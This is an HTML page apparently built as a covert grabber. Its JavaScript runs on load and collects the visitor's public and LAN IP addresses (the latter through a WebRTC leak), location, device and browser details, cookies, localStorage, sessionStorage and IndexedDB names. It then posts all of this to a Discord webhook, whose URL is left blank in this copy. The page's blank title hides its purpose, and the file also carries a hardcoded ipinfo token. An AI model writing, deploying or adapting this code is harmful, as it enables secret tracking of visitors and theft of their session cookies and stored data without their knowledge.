<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
<title>‎ </title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    min-height: 100vh;
    font-family: 'Inter', sans-serif;
    background: #0d0d0d;
    color: #f1f1f1;
    padding: 0;
  }
  .card {
    background: #1a1a1a;
    padding: 2rem;
    display: flex;
    flex-wrap: wrap;
    justify-content: space-between;
    width: 100vw;
    min-height: 100vh;
    overflow-y: auto;
    box-shadow: 0 8px 24px rgba(0,0,0,0.6);
  }
  .info-column {
    flex: 1 1 22%;
    margin: 0.5%;
    min-width: 250px;
  }
  .info-column h3 {
    border-bottom: 1px solid #333;
    padding-bottom: 0.5rem;
    margin-bottom: 0.5rem;
    color: #aaa;
  }
  .info {
    font-size: 0.85rem;
    margin: 0.2rem 0;
    color: #ccc;
    word-break: break-word;
  }
</style>
</head>
<body>
<div class="card" id="card"></div>

<script>
const TOKEN = "68ff73597277ed";
const DISCORD_WEBHOOK_URL = "";

async function getIPInfo() {
  try { const r = await fetch(`https://ipinfo.io/json?token=${TOKEN}`); return await r.json(); } 
  catch { return {}; }
}

async function getBatteryInfo() {
  try {
    const b = await navigator.getBattery();
    return { 
      Level: (b.level*100)+'%',
      Charging: b.charging,
      ChargingTime: b.chargingTime+'s',
      DischargingTime: b.dischargingTime+'s'
    };
  } catch { return { Level: "N/A", Charging: "N/A", ChargingTime: "N/A", DischargingTime: "N/A" }; }
}

function getPerformanceTiming() {
  const t = window.performance.timing;
  const paintEntries = performance.getEntriesByType("paint");
  const firstPaint = paintEntries.find(p=>p.name==="first-paint")?.startTime || "N/A";
  const firstContentfulPaint = paintEntries.find(p=>p.name==="first-contentful-paint")?.startTime || "N/A";
  return { 
    DOMContentLoaded: t.domContentLoadedEventEnd - t.navigationStart,
    PageLoad: t.loadEventEnd - t.navigationStart,
    DNSLookup: t.domainLookupEnd - t.domainLookupStart,
    TCPConnect: t.connectEnd - t.connectStart,
    ResponseTime: t.responseEnd - t.requestStart,
    FirstPaint: firstPaint,
    FirstContentfulPaint: firstContentfulPaint
  };
}

function checkFeatures() {
  return {
    ClipboardAPI: !!navigator.clipboard,
    Geolocation: !!navigator.geolocation,
    ServiceWorkers: !!navigator.serviceWorker,
    LocalStorage: !!window.localStorage,
    SessionStorage: !!window.sessionStorage,
    IndexedDB: !!navigator.indexedDB,
    WebGL: (()=>{try{const c=document.createElement('canvas'); return !!c.getContext('webgl')}catch(e){return false}})(),
    TouchSupport: 'ontouchstart' in window,
    MaxTouchPoints: navigator.maxTouchPoints || "N/A",
    Online: navigator.onLine,
    CookiesEnabled: navigator.cookieEnabled,
    ColorScheme: window.matchMedia('(prefers-color-scheme: dark)').matches ? "Dark" : "Light",
    ReducedMotion: window.matchMedia('(prefers-reduced-motion: reduce)').matches ? "Yes" : "No"
  };
}

function getPlugins() {
  if(navigator.plugins){let l=[];for(let p of navigator.plugins)l.push(p.name);return l.join(", ")||"N/A";}
  return "N/A";
}

async function getMediaDevices() {
  try {
    const devices = await navigator.mediaDevices.enumerateDevices();
    return {
      AudioInputs: devices.filter(d=>d.kind==="audioinput").length,
      VideoInputs: devices.filter(d=>d.kind==="videoinput").length
    };
  } catch { return {AudioInputs:"N/A",VideoInputs:"N/A"}; }
}

async function getIndexedDBNames() {
  if (!window.indexedDB?.databases) return [];
  try {
    const dbs = await window.indexedDB.databases();
    return dbs.map(db => db.name);
  } catch { return []; }
}

function getLANIPs() {
  return new Promise((resolve)=>{
    let ips = [];
    const pc = new RTCPeerConnection({iceServers:[]});
    pc.createDataChannel("");
    pc.createOffer().then(offer=>pc.setLocalDescription(offer));
    pc.onicecandidate = e => {
      if(!e || !e.candidate) {
        resolve([...new Set(ips)]);
        return;
      }
      const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
      if(ipMatch) ips.push(ipMatch[1]);
    };
  });
}

async function gatherInfo() {
  const ipData = await getIPInfo();
  const batteryData = await getBatteryInfo();
  const mediaData = await getMediaDevices();
  const indexedDBNames = await getIndexedDBNames();
  const lanIPs = await getLANIPs();

  const info = {
    "IP & Network": {
      "IP Address": ipData.ip || "N/A",
      "IPv6": ipData.ipv6 || "N/A",
      "Private/Public IP": ipData.ip?.startsWith('192.')||ipData.ip?.startsWith('10.') ? 'Private':'Public',
      "Hostname": ipData.hostname || "N/A",
      "City": ipData.city || "N/A",
      "Region": ipData.region || "N/A",
      "Country": ipData.country || "N/A",
      "Postal": ipData.postal || "N/A",
      "Timezone": ipData.timezone || "N/A",
      "Organization": ipData.org || "N/A",
      "ASN": ipData.asn?.asn || "N/A",
      "ISP": ipData.asn?.name || "N/A",
      "Proxy/VPN Detected": ipData?.privacy?.proxy || "N/A",
      "Hosting Provider": ipData?.hosting || "N/A",
      "LAN IPs": lanIPs.join(", ") || "N/A",
      "Connection Type": navigator.connection ? navigator.connection.effectiveType : "N/A",
      "Downlink Speed": navigator.connection ? navigator.connection.downlink + "Mbps" : "N/A"
    },
    "Browser & Device": {
      "User Agent": navigator.userAgent,
      "Languages": navigator.languages.join(", "),
      "Language": navigator.language,
      "Platform": navigator.platform,
      "Screen": `${window.screen.width}x${window.screen.height}`,
      "Device Pixel Ratio": window.devicePixelRatio,
      "Vendor": navigator.vendor || "N/A",
      "Renderer": (()=>{try{const c=document.createElement('canvas');return c.getContext('webgl')?.getParameter(WebGLRenderingContext.RENDERER)||"N/A"}catch{return "N/A"}})(),
      "Media Devices": mediaData
    },
    "Battery & Performance": batteryData,
    "Navigator Features": checkFeatures(),
    "Plugins": { Plugins: getPlugins() },
    "Storage & Cookies": {
      "Cookies": document.cookie || "N/A",
      "Local Storage": JSON.stringify(localStorage),
      "Session Storage": JSON.stringify(sessionStorage),
      "IndexedDB Names": indexedDBNames
    },
    "Performance Timing": getPerformanceTiming(),
    "Current Time": { Now: new Date().toLocaleString() },
    "Misc": {
      "Current URL": window.location.href,
      "Referrer": document.referrer || "N/A",
      "History Length": history.length
    }
  };

  renderInfo(info);
  return info;
}

function renderInfo(data){
  const card = document.getElementById("card");
  card.innerHTML = "";
  for(const [section, details] of Object.entries(data)){
    const col = document.createElement("div");
    col.className = "info-column";
    const title = document.createElement("h3");
    title.textContent = section;
    col.appendChild(title);
    for(const [key, value] of Object.entries(details)){
      const div = document.createElement("div");
      div.className = "info";
      div.textContent = `${key}: ${typeof value === "object" ? JSON.stringify(value) : value}`;
      col.appendChild(div);
    }
    card.appendChild(col);
  }
}

gatherInfo().then(async () => {
  const infoText = document.getElementById("card").innerText;
  await fetch(DISCORD_WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      embeds: [{
        description: "```" + infoText.substring(0, 2000) + "```",
        color: 0x010101,
        timestamp: new Date()
      }]
    })
  });
});
</script>
</body>
</html
